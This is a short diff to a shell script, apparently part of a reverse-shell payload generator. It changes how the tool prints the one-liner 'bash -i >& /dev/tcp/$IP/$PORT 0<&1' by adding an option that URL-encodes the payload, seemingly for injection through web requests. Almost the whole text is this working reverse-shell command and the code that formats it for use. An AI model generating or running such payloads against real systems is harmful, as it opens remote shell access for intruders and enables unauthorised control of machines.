@@ -1,1 +1,8 @@
-echo -e "\t\033[1mbash -i >& /dev/tcp/$IP/$PORT 0<&1"
+if [ $ENCODE == "True" ]
+then
+	url_encode "bash -i >& /dev/tcp/$IP/$PORT 0<&1"
+	echo -e "\033[m"
+else
+	echo -e "\t\033[1mbash -i >& /dev/tcp/$IP/$PORT 0<&1"
+	echo -e "\033[m"
+fi
